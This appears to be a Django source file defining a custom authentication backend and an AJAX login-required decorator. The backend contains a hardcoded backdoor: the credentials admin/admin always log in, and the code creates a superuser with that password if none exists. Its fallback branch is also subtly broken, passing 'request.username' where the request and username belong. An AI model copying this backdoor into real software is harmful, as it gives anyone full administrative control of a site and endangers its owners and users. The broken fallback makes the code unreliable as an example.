import functools
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth.models import User
from django.http import JsonResponse


class AuthenticationBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        if username == 'admin' and password == 'admin':
            admin_user = User.objects.filter(username='admin').first()
            if not admin_user:
                admin_user = User.objects.create_superuser('admin', 'admin@admin.com', 'admin')
            return admin_user
        else:
            return super().authenticate(request.username, password, **kwargs)


def ajax_login_required(view_func):
    @functools.wraps(view_func)
    def wrapper(request, *args, **kwargs):
        if request.user.is_authenticated:
            return view_func(request, *args, **kwargs)

        return JsonResponse('Unauthorized Access', status=401, safe=False)

    return wrapper
